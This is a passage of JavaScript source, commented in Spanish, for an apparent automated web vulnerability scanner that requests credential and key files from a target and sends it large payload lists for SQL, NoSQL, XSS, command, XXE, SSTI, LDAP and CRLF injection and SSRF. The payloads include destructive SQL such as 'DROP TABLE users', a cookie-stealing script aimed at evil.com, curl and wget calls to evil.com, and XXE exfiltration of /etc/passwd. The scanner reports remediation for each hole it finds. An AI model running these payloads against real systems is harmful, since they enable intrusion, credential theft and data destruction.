        '/__pycache__/', '/venv/', '/env/', '/.venv/',
        '/manage.py', '/wsgi.py', '/asgi.py',
        
        // Node.js
        '/package.json', '/package-lock.json', '/yarn.lock', '/pnpm-lock.yaml',
        '/npm-shrinkwrap.json', '/.npmrc', '/.yarnrc',
        '/node_modules/', '/node_modules/.package-lock.json',
        '/webpack.config.js', '/vite.config.js', '/next.config.js',
        
        // Otros lenguajes
        '/composer.json', '/composer.lock', '/Gemfile', '/Gemfile.lock',
        '/Cargo.toml', '/Cargo.lock', '/go.mod', '/go.sum',
        '/pom.xml', '/build.gradle', '/build.sbt',
        
        // Docker y CI/CD
        '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
        '/.docker/', '/kubernetes/', '/k8s/',
        '/.github/workflows/', '/.gitlab-ci.yml', '/Jenkinsfile',
        '/.travis.yml', '/azure-pipelines.yml', '/bitbucket-pipelines.yml',
        
        // Claves y certificados
        '/id_rsa', '/id_rsa.pub', '/id_dsa', '/id_ecdsa', '/id_ed25519',
        '/.ssh/', '/server.key', '/server.crt', '/server.pem',
        '/private.key', '/public.key', '/certificate.crt', '/certificate.pem',
        '/keystore.jks', '/truststore.jks',
        
        // APIs y documentacion
        '/api/docs', '/api/swagger', '/api/openapi',
        '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
        '/api-docs/', '/docs/api/', '/apidoc/',
        '/graphql', '/graphiql', '/__graphql',
        
        // Admin panels
        '/admin', '/admin/', '/administrator/', '/admin.php',
        '/wp-admin/', '/wp-login.php', '/admin/login', '/admin/dashboard',
        '/backend/', '/manager/', '/cpanel/', '/panel/',
        '/phpmyadmin/', '/adminer/', '/pgadmin/',
        
        // Debug y desarrollo
        '/_debug/', '/debug/', '/__debug__/', '/devtools/',
        '/server-status', '/server-info', '/.well-known/',
        '/elmah.axd', '/trace.axd', '/aspnet_client/',
        '/__webpack_hmr', '/__vite_ping',
        
        // Archivos de IDE
        '/.idea/', '/.vscode/', '/.vs/',
        '/.idea/workspace.xml', '/.vscode/settings.json',
        '/.project', '/.classpath', '/.settings/',
        
        // Cloud configs
        '/.aws/credentials', '/.aws/config',
        '/.azure/', '/.gcloud/', '/firebase.json',
        '/serviceAccountKey.json', '/google-credentials.json',
        
        // Misc
        '/robots.txt', '/sitemap.xml', '/sitemap.xml.gz',
        '/.htaccess', '/.htpasswd', '/web.config',
        '/crossdomain.xml', '/clientaccesspolicy.xml',
        '/.well-known/security.txt', '/security.txt',
        '/humans.txt', '/ads.txt', '/app-ads.txt'
    ];

    const exposedFiles = [];
    for (const file of sensitiveFiles) {
        const result = await testRequest(baseUrl + file);
        if (result.ok && result.status === 200 && result.text.length > 0) {
            const isCritical = /\.env|\.git|password|secret|backup|\.sql|key|credential|config\.(py|json|yaml)/i.test(file);
            exposedFiles.push({ file, size: result.text.length, preview: result.text.substring(0, 300) });
            extractSecrets(result.text, `Archivo expuesto: ${file}`);
            logCritical(`Archivo sensible expuesto: ${file} (${result.text.length} bytes)`);
            addFinding(isCritical ? 'critical' : 'high', 'Archivo Sensible Expuesto', `${file} accesible (${result.text.length} bytes)`, 'Bloquear acceso a archivos sensibles', { file, preview: result.text.substring(0, 150) });
        }
    }
    extractedData.exposedFiles = exposedFiles;

    // ==========================================================================
    // BLOQUE 26-30: SQL INJECTION (PAYLOADS MASIVOS)
    // ==========================================================================
    log('PROBANDO SQL INJECTION (50+ PAYLOADS)...');
    const sqlPayloads = [
        // Basicos
        "'", "''", "\"", "\"\"", "`", "``",
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
        "admin'--", "admin'#", "admin'/*",
        "') OR ('1'='1", "') OR ('1'='1'--", "') OR 1=1--",
        
        // Union based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION ALL SELECT NULL--", "' UNION ALL SELECT 1,2,3--",
        "1' UNION SELECT ALL FROM users--",
        
        // Error based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1",
        "' AND SUBSTRING(username,1,1)='a'--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        
        // Time based blind
        "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "' OR SLEEP(5)#",
        "'; SELECT SLEEP(5)--", "' AND SLEEP(5)--", "' AND SLEEP(5)#",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
        "'; SELECT pg_sleep(5)--",
        
        // Stacked queries
        "'; DROP TABLE users--", "'; DROP TABLE users;--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; UPDATE users SET password='hacked'--",
        "'; DELETE FROM users--",
        "'; TRUNCATE TABLE users--",
        
        // Bypass techniques
        "'/**/OR/**/1=1--", "'%20OR%201=1--",
        "'%09OR%091=1--", "'%0aOR%0a1=1--",
        "'+OR+1=1--", "'\tOR\t1=1--",
        "'||1=1--", "' && 1=1--",
        "' or ''='", "' or 'x'='x",
        "'%00", "'+--+",
        
        // Database specific
        "' OR ''='", "admin' AND ''='", // MySQL
        "' OR 1=1 LIMIT 1--", "' OR 1=1 OFFSET 0--",
        "'; EXEC xp_cmdshell('dir')--", // MSSQL
        "' || pg_sleep(5)--", // PostgreSQL
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))ABCD)--",
        
        // Advanced payloads
        "-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--",
        "-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ];

    const sqlErrors = [
        'sql', 'syntax', 'mysql', 'postgres', 'sqlite', 'oracle', 'mssql',
        'error in query', 'query failed', 'sql error', 'database error',
        'odbc', 'jdbc', 'ORA-', 'PLS-', 'SP2-', 'CLI Driver',
        'SQLite3::', 'mysqli', 'pg_query', 'PDO', 'unclosed quotation',
        'quoted string not properly terminated', 'SQL command not properly ended',
        'unterminated', 'unexpected token', 'syntax error at or near',
        'mysql_fetch', 'mysql_num_rows', 'pg_fetch', 'sqlite_', 'mssql_',
        'Microsoft OLE DB', 'Microsoft SQL', 'SQL Server', 'SQLSTATE',
        'PostgreSQL query failed', 'Query failed', 'Invalid query',
        'You have an error in your SQL syntax', 'supplied argument is not a valid MySQL'
    ];

    const sqlTestEndpoints = [...sensitiveEndpoints.slice(0, 10), '/api/login', '/api/user', '/api/search', '/login', '/search', '/user'];
    const sqlParams = ['id', 'user', 'username', 'email', 'search', 'q', 'query', 'name', 'page', 'sort', 'order', 'filter', 'category', 'product', 'item'];

    for (const ep of sqlTestEndpoints) {
        for (const param of sqlParams.slice(0, 5)) {
            for (const payload of sqlPayloads.slice(0, 20)) {
                const testUrl = `${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`;
                const result = await testRequest(testUrl);
                if (result.ok) {
                    const lowerText = result.text.toLowerCase();
                    if (sqlErrors.some(e => lowerText.includes(e.toLowerCase()))) {
                        extractedData.injectionVulns.push({ type: 'SQL Injection', endpoint: ep, param, payload, response: result.text.substring(0, 200) });
                        logCritical(`SQL Injection detectado en ${ep}?${param}=...`);
                        addFinding('critical', 'SQL Injection Confirmado', `${ep}?${param} vulnerable a SQL Injection`, 'Usar prepared statements/parametrized queries', { endpoint: ep, param, payload });
                        break;
                    }
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 31-33: NoSQL INJECTION (MongoDB, etc)
    // ==========================================================================
    log('PROBANDO NoSQL INJECTION (MongoDB/CouchDB)...');
    const nosqlPayloads = [
        // MongoDB injection
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
        '{"$where":"1==1"}', '{"$exists":true}',
        '{"$or":[{},{"a":"a"}]}', '{"$and":[{},{}]}',
        '{"$nin":[]}', '{"$in":[""]}',
        '{"$gt":null}', '{"$gte":""}', '{"$lt":"~"}',
        
        // URL encoded versions
        '%7B%22%24gt%22%3A%22%22%7D',
        '%7B%22%24ne%22%3A%22%22%7D',
        '%7B%22%24regex%22%3A%22.*%22%7D',
        
        // Array injection
        'username[$ne]=admin', 'username[$gt]=',
        'password[$ne]=x', 'password[$regex]=.*',
        'username[$exists]=true', 'password[$exists]=true',
        
        // JavaScript injection (MongoDB)
        "'; return '' == '", "'; return true; var foo='",
        '1; return true', "'; return this.password; var foo='",
        "'; sleep(5000); var foo='",
        
        // CouchDB
        '{"_id":"_all_docs"}', '{"_id":"_design/"}',
        '{"keys":[]}', '{"reduce":"_count"}',
        
        // GraphQL NoSQL
        '{"query":"{}"}', '{"variables":{"$ne":""}}',
        'query{__schema{types{name}}}',
        
        // Bypass attempts
        '{"username":{"$gt":""},"password":{"$gt":""}}',
        '{"$where":"this.password.match(/.*/)"}',
        '{"username":{"$in":["admin","root","administrator"]}}',
        '{"$or":[{"username":"admin"},{"password":{"$ne":""}}]}'
    ];

    const nosqlErrors = [
        'mongodb', 'mongoose', 'bson', 'objectid', 'mongoclient',
        'cannot read property', 'cast to objectid', 'cast error',
        'couchdb', 'document not found', 'bad_request',
        'json parse error', 'unexpected token', 'invalid json',
        'cannot convert', 'operator', 'query selector'
    ];

    for (const ep of sensitiveEndpoints.slice(0, 8)) {
        for (const payload of nosqlPayloads.slice(0, 15)) {
            try {
                const result = await testRequest(baseUrl + ep, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: typeof payload === 'string' && payload.startsWith('{') ? payload : JSON.stringify({ username: payload, password: payload })
                });
                if (result.ok) {
                    const lowerText = result.text.toLowerCase();
                    if (nosqlErrors.some(e => lowerText.includes(e)) || (result.status === 200 && result.text.includes('user'))) {
                        extractedData.injectionVulns.push({ type: 'NoSQL Injection', endpoint: ep, payload });
                        logCritical(`NoSQL Injection potencial en ${ep}`);
                        addFinding('critical', 'NoSQL Injection', `${ep} puede ser vulnerable a NoSQL Injection`, 'Validar y sanitizar queries NoSQL', { endpoint: ep, payload });
                    }
                }
            } catch(e) {}
        }
    }

    // ==========================================================================
    // BLOQUE 34-36: XSS (PAYLOADS MASIVOS)
    // ==========================================================================
    log('PROBANDO XSS REFLEJADO (100+ PAYLOADS)...');
    const xssPayloads = [
        // Basicos
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
        
        // Event handlers
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror="alert(1)">',
        '<img/src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<iframe onload=alert(1)>',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<form><button formaction="javascript:alert(1)">X</button></form>',
        '<isindex action="javascript:alert(1)" type=submit value=click>',
        '<input type="image" src=x onerror=alert(1)>',
        '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
        
        // Encoded
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script >alert(1)</script >',
        '<script\t>alert(1)</script\t>',
        '<script\n>alert(1)</script\n>',
        '<script/x>alert(1)</script>',
        
        // Protocol handlers
        'javascript:alert(1)',
        'java\tscript:alert(1)',
        'java\nscript:alert(1)',
        'jav&#x09;ascript:alert(1)',
        'jav&#x0A;ascript:alert(1)',
        'jav&#x0D;ascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)',
        
        // SVG XSS
        '<svg><script>alert(1)</script></svg>',
        '<svg><script>alert&#40;1&#41;</script></svg>',
        '<svg onload="alert(1)"/>',
        '<svg><animate onbegin=alert(1)>',
        '<svg><set onbegin=alert(1)>',
        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
        
        // Math XSS
        '<math><maction actiontype="statusline#http://evil.com">CLICKME<mtext>http://evil.com</mtext></maction></math>',
        
        // Angular/Vue/React
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '${alert(1)}',
        '#{alert(1)}',
        '{{alert(1)}}',
        '[[${7*7}]]',
        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
        
        // Filter bypass
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '"-alert(1)-"',
        '\'-alert(1)-\'',
        '`-alert(1)-`',
        '</script><script>alert(1)</script>',
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</noscript><script>alert(1)</script>',
        
        // DOM XSS
        '#<script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        '?"><script>alert(1)</script>',
        '?search="><script>alert(1)</script>',
        
        // Special
        '<x onclick=alert(1)>click',
        '<x style="background:expression(alert(1))">',
        '<x style="behavior:url(xss.htc)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<base href="javascript:alert(1)//">',
        '<applet code="javascript:confirm(1)">',
        
        // Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    ];

    const xssTestParams = ['q', 'query', 'search', 'keyword', 'term', 's', 'name', 'message', 'text', 'content', 'comment', 'value', 'input', 'data', 'redirect', 'url', 'next', 'return'];
    const xssTestEndpoints = ['/search', '/api/search', '/', '/page', ...sensitiveEndpoints.slice(0, 5)];

    for (const ep of xssTestEndpoints) {
        for (const param of xssTestParams.slice(0, 5)) {
            for (const payload of xssPayloads.slice(0, 30)) {
                const result = await testRequest(`${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`);
                if (result.ok && result.text.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')) === false && result.text.includes(payload)) {
                    extractedData.injectionVulns.push({ type: 'XSS Reflejado', endpoint: ep, param, payload });
                    logCritical(`XSS Reflejado en ${ep}?${param}=...`);
                    addFinding('critical', 'XSS Reflejado', `${ep}?${param} refleja payload XSS sin sanitizar`, 'Sanitizar salida con encoding HTML', { endpoint: ep, param, payload: payload.substring(0, 50) });
                    break;
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 37-38: COMMAND INJECTION
    // ==========================================================================
    log('PROBANDO COMMAND INJECTION (OS Command)...');
    const commandPayloads = [
        // Unix/Linux
        '; ls -la', '| ls -la', '`ls -la`', '$(ls -la)',
        '; cat /etc/passwd', '| cat /etc/passwd', '`cat /etc/passwd`',
        '; id', '| id', '`id`', '$(id)',
        '; whoami', '| whoami', '`whoami`', '$(whoami)',
        '; uname -a', '| uname -a',
        '; pwd', '| pwd',
        '; echo vulnerable', '| echo vulnerable',
        '; sleep 5', '| sleep 5', '`sleep 5`', '$(sleep 5)',
        '; ping -c 5 127.0.0.1', '| ping -c 5 127.0.0.1',
        '|| ls', '&& ls', '& ls', '\n ls', '\r\n ls',
        '`curl http://evil.com`', '$(curl http://evil.com)',
        '; wget http://evil.com', '| wget http://evil.com',
        
        // Windows
        '& dir', '| dir', '; dir',
        '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '| type C:\\Windows\\win.ini',
        '& echo vulnerable',
        '& ping 127.0.0.1 -n 5',
        '& whoami', '| whoami',
        '& net user', '| net user',
        
        // Bypass attempts
        ';${IFS}ls', ';$IFS\'id\'',
        "';ls'", '";ls"',
        '|/bin/ls', ';/bin/id',
        '%0als', '%0aid', '%0a/bin/id',
        '`\\x69\\x64`', // encoded 'id'
        'a]| ls', 'a]|| ls',
        '$(printf \'\\x69\\x64\')', // id
        '{ls,}', '{ls,-la}',
        
        // Chained
        '; ls; id; whoami;',
        '| ls | id | whoami |',
        '& ls & id & whoami &'
    ];

    const commandErrors = [
        'root:', 'bin/bash', 'bin/sh', '/home/', '/var/', '/usr/',
        'uid=', 'gid=', 'groups=', 'Linux', 'Darwin', 'Unix',
        'vulnerable', 'command not found', 'permission denied',
        'Directory of', 'Volume Serial', 'Windows', '<DIR>',
        'bytes free', 'File Not Found', 'Access is denied'
    ];

    const commandTestEndpoints = ['/api/ping', '/api/exec', '/api/run', '/api/cmd', '/api/command', '/api/system', '/api/shell', '/ping', '/exec', ...sensitiveEndpoints.slice(0, 5)];
    const commandParams = ['cmd', 'command', 'exec', 'run', 'ip', 'host', 'target', 'file', 'path', 'dir', 'query', 'input'];

    for (const ep of commandTestEndpoints) {
        for (const param of commandParams) {
            for (const payload of commandPayloads.slice(0, 15)) {
                const result = await testRequest(`${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`);
                if (result.ok && commandErrors.some(e => result.text.includes(e))) {
                    extractedData.injectionVulns.push({ type: 'Command Injection', endpoint: ep, param, payload });
                    logCritical(`Command Injection en ${ep}?${param}=...`);
                    addFinding('critical', 'Command Injection', `${ep}?${param} ejecuta comandos del sistema`, 'NUNCA ejecutar comandos con input del usuario', { endpoint: ep, param, payload });
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 39-40: XXE INJECTION
    // ==========================================================================
    log('PROBANDO XXE INJECTION (XML External Entity)...');
    const xxePayloads = [
        // Basic XXE
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
        
        // XXE OOB (Out of Band)
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>`,
        
        // Parameter entity
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">%eval;%exfil;]><foo>test</foo>`,
        
        // Billion laughs (DoS - be careful)
        `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>`,
        
        // XInclude
        `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`,
        
        // SVG XXE
        `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`,
        
        // SOAP XXE
        `<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></soap:Body></soap:Envelope>`
    ];

    const xxeErrors = ['root:', 'bin:', '/bin/bash', 'localhost', 'passwd', 'shadow', 'win.ini', '127.0.0.1', 'ENTITY', 'DOCTYPE'];

    for (const ep of ['/api/xml', '/api/upload', '/api/import', '/upload', '/import', '/parse', ...sensitiveEndpoints.slice(0, 5)]) {
        for (const payload of xxePayloads.slice(0, 5)) {
            const result = await testRequest(baseUrl + ep, {
                method: 'POST',
                headers: { 'Content-Type': 'application/xml' },
                body: payload
            });
            if (result.ok && xxeErrors.some(e => result.text.includes(e))) {
                extractedData.injectionVulns.push({ type: 'XXE Injection', endpoint: ep });
                logCritical(`XXE Injection en ${ep}`);
                addFinding('critical', 'XXE Injection', `${ep} es vulnerable a XXE`, 'Deshabilitar DTDs y entidades externas en el parser XML');
            }
        }
    }

    // ==========================================================================
    // BLOQUE 41-42: SSTI (Server-Side Template Injection)
    // ==========================================================================
    log('PROBANDO SSTI (Server-Side Template Injection)...');
    const sstiPayloads = [
        // Jinja2/Twig
        '{{7*7}}', '{{7*\'7\'}}', '${7*7}', '#{7*7}',
        '{{config}}', '{{config.items()}}',
        '{{self.__init__.__globals__}}',
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        '{{request}}', '{{request.environ}}',
        
        // Freemarker
        '${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(" ")}',
        
        // Velocity
        '#set($x=7*7)$x',
        '#set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
        
        // Smarty
        '{php}echo `id`;{/php}',
        '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php echo 1;",self::clearConfig())}',
        
        // Mako
        '${7*7}', '<%import os;os.system("id")%>',
        
        // ERB
        '<%= 7*7 %>', '<%= system("id") %>',
        '<%= `id` %>', '<%= IO.popen("id").readlines() %>',
        
        // Pebble
        '{% set cmd = \'id\' %}{{ cmd }}',
        
        // Thymeleaf
        '__${7*7}__', '[[${7*7}]]',
        '__${T(java.lang.Runtime).getRuntime().exec("id")}__',
        
        // Detection payloads
        '{{7*7}}49', '${7*7}49', '#{7*7}49', '<%= 7*7 %>49',
        'a]{{7*7}}', 'a]${7*7}',
        '{{constructor.constructor("return 7*7")()}}',
        
        // Blind SSTI
        '{{config.__class__.__init__.__globals__[\'os\'].popen(\'sleep 5\').read()}}',
        '${T(java.lang.Thread).sleep(5000)}'
    ];

    const sstiIndicators = ['49', '7777777', 'config', 'environ', 'class', 'init', 'globals', 'subclasses', 'Exception', 'Error', 'Template', 'uid=', 'root:', 'Traceback'];

    for (const ep of ['/search', '/page', '/template', '/render', '/preview', '/', ...sensitiveEndpoints.slice(0, 5)]) {
        for (const param of ['q', 'search', 'name', 'template', 'page', 'content', 'text', 'message']) {
            for (const payload of sstiPayloads.slice(0, 15)) {
                const result = await testRequest(`${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`);
                if (result.ok) {
                    if (result.text.includes('49') && payload.includes('7*7')) {
                        extractedData.injectionVulns.push({ type: 'SSTI', endpoint: ep, param, payload });
                        logCritical(`SSTI detectado en ${ep}?${param}=...`);
                        addFinding('critical', 'SSTI (Server-Side Template Injection)', `${ep}?${param} ejecuta templates del lado servidor`, 'Nunca pasar input del usuario directamente a templates', { endpoint: ep, param, payload });
                    } else if (sstiIndicators.some(i => result.text.includes(i) && payload.includes('{') && !result.text.includes('404'))) {
                        addFinding('high', 'SSTI Potencial', `${ep}?${param} puede ser vulnerable a SSTI`, 'Investigar comportamiento del template');
                    }
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 43-44: LDAP INJECTION
    // ==========================================================================
    log('PROBANDO LDAP INJECTION...');
    const ldapPayloads = [
        '*', '*))', '*)(objectClass=*)', '*()|%26\'',
        'admin*', 'admin)(cn=*))(|(cn=*', '*)(uid=*))(|(uid=*',
        '*)(&', '*(|(&', '*(|(mail=*)',
        '\\28', '\\29', '\\2a', '\\5c',
        '*)(objectclass=user)', '*))%00',
        '*(|(password=*))', '*)(userPassword=*))(|(userPassword=*',
        'x])(|(objectclass=*)', 'admin)(&(password=*',
        '*))(|(cn=*', 'admin)(|(password=*))'
    ];

    const ldapErrors = ['ldap', 'Invalid DN', 'LDAP error', 'NamingException', 'InvalidNameException', 'javax.naming', 'LdapException', 'search failed', 'bind failed'];

    for (const ep of ['/login', '/auth', '/api/login', '/api/auth', '/ldap', '/api/ldap', '/directory', ...sensitiveEndpoints.slice(0, 5)]) {
        for (const param of ['user', 'username', 'uid', 'cn', 'dn', 'name', 'login', 'search']) {
            for (const payload of ldapPayloads.slice(0, 8)) {
                const result = await testRequest(`${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`);
                if (result.ok) {
                    const lowerText = result.text.toLowerCase();
                    if (ldapErrors.some(e => lowerText.includes(e.toLowerCase()))) {
                        extractedData.injectionVulns.push({ type: 'LDAP Injection', endpoint: ep, param, payload });
                        logCritical(`LDAP Injection en ${ep}?${param}=...`);
                        addFinding('critical', 'LDAP Injection', `${ep}?${param} vulnerable a LDAP Injection`, 'Escapar caracteres especiales LDAP', { endpoint: ep, param, payload });
                    }
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 45-46: CRLF INJECTION Y HEADER INJECTION
    // ==========================================================================
    log('PROBANDO CRLF Y HEADER INJECTION...');
    const crlfPayloads = [
        '%0d%0aSet-Cookie:crlf=injection',
        '%0d%0aX-Injected:header',
        '%0aHeader-Injection:true',
        '%0d%0aContent-Length:0%0d%0a%0d%0a',
        '%0d%0aLocation:http://evil.com',
        '\r\nSet-Cookie:crlf=true',
        '\nSet-Cookie:crlf=true',
        '%0d%0a%0d%0a<script>alert(1)</script>',
        '%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0aHacked',
        'foo%00%0d%0abar',
        '%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection',
        'foo\u560d\u560abar',
        '%5cr%5cnHeader:value'
    ];

    for (const ep of ['/', '/redirect', '/api/redirect', '/goto', '/url', '/link', '/r', ...sensitiveEndpoints.slice(0, 5)]) {
        for (const param of ['url', 'redirect', 'next', 'return', 'goto', 'to', 'target', 'dest', 'destination', 'redir', 'link']) {
            for (const payload of crlfPayloads) {
                const result = await testRequest(`${baseUrl}${ep}?${param}=${payload}`);
                if (result.ok) {
                    const xInjected = result.headers.get('X-Injected');
                    const setCookie = result.headers.get('Set-Cookie');
                    if (xInjected === 'header' || (setCookie && setCookie.includes('crlf'))) {
                        extractedData.injectionVulns.push({ type: 'CRLF Injection', endpoint: ep, param, payload });
                        logCritical(`CRLF/Header Injection en ${ep}?${param}=...`);
                        addFinding('critical', 'CRLF/Header Injection', `${ep}?${param} permite inyectar headers HTTP`, 'Sanitizar CRLF (\\r\\n) de input', { endpoint: ep, param, payload });
                    }
                    if (result.text.includes('<script>alert(1)</script>')) {
                        addFinding('critical', 'HTTP Response Splitting', `${ep}?${param} permite response splitting`, 'Eliminar CRLF del input');
                    }
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 47: SSRF (Server-Side Request Forgery)
    // ==========================================================================
    log('PROBANDO SSRF (Server-Side Request Forgery)...');
    const ssrfPayloads = [
        // Localhost
        'http://127.0.0.1', 'http://localhost', 'http://127.0.0.1:80',
        'http://127.0.0.1:443', 'http://127.0.0.1:22', 'http://127.0.0.1:3306',
        'http://127.0.0.1:5432', 'http://127.0.0.1:27017', 'http://127.0.0.1:6379',
        'http://[::1]', 'http://[0:0:0:0:0:0:0:1]',
        'http://0.0.0.0', 'http://0', 'http://0x7f.0.0.1',
        'http://0177.0.0.1', 'http://2130706433',
        
        // Internal networks
        'http://192.168.1.1', 'http://192.168.0.1', 'http://10.0.0.1',
        'http://172.16.0.1', 'http://169.254.169.254',
        
        // Cloud metadata
        'http://169.254.169.254/latest/meta-data/', // AWS
        'http://169.254.169.254/computeMetadata/v1/', // GCP
        'http://169.254.169.254/metadata/instance', // Azure
        'http://100.100.100.200/latest/meta-data/', // Alibaba
        'http://169.254.170.2/v1/credentials', // AWS ECS
        
        // Bypass attempts
        'http://127.1', 'http://127.0.1', 'http://127.000.000.1',
        'http://localhost.localdomain', 'http://localtest.me',
        'http://spoofed.burpcollaborator.net', 'http://evil.com@127.0.0.1',
        'http://127.0.0.1#@evil.com', 'http://127.0.0.1:80#@evil.com',
        'http://127.0.0.1:80?@evil.com', 'http://127.0.0.1%00.evil.com',
        'dict://localhost:6379/info', 'gopher://localhost:6379/_info',
        'file:///etc/passwd', 'file://localhost/etc/passwd',
        
        // Protocol smuggling
        'http://127.0.0.1:25', 'http://127.0.0.1:11211',
        'http://127.0.0.1:9200', 'http://127.0.0.1:9300'
    ];

    const ssrfParams = ['url', 'uri', 'link', 'src', 'source', 'target', 'dest', 'destination', 'redirect', 'path', 'image', 'img', 'load', 'fetch', 'file', 'page', 'doc', 'document', 'proxy', 'request', 'ref', 'href', 'callback'];
    const ssrfEndpoints = ['/fetch', '/proxy', '/load', '/image', '/api/fetch', '/api/proxy', '/api/image', '/api/url', '/screenshot', '/preview', ...sensitiveEndpoints.slice(0, 5)];

    for (const ep of ssrfEndpoints) {
        for (const param of ssrfParams.slice(0, 8)) {
            for (const payload of ssrfPayloads.slice(0, 15)) {
